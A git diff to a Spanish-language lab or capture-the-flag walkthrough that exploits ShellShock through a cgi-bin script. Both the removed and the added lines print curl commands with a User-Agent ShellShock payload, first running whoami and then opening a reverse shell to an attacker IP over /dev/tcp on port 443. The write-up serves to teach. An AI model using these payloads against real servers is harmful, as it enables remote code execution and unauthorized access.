@@ -70,7 +70,7 @@ Cuando tenemos la carpeta cgi-bin, podemos hacer un ataque de ShellShock de la s
 ```
 
 ```bash 
-curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; /usr/bin/whoami"  # Debemos de coloca la ruta del archivo.sh, ya que si solo colocamos /cgi-bin/ nos sladra que no tenemos permisos
+❯ curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; /usr/bin/whoami"  # Debemos de colocar la ruta del archivo.sh, ya que si solo colocamos /cgi-bin/ nos sladra que no tenemos permisos
 
 	# s = Silence 
 	# H = Cabecera para el ataque de ShellShock
@@ -79,8 +79,7 @@ curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; /usr/bin/w
 # Nos sale que el nombre del usuario es Shelly
 
 # Podemos usar el ShellShock para ganar acceso a la maquina.
-curl -s -X GET http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
-
+❯ curl -s -X GET http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
 ```
 
 Antes de usar el comando anterior, debemos de colocarnos en escucha para recibir la revershell
